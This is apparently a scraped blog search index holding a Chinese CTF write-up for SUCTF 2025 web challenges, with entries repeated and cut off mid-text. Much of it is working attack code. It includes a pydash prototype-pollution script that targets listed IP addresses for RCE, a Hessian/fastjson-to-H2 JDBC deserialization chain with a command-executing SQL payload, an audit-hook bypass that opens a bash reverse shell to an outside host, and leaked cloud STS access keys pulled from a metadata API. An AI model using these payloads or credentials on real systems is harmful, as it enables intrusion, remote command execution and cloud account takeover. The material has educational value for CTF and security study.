除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY 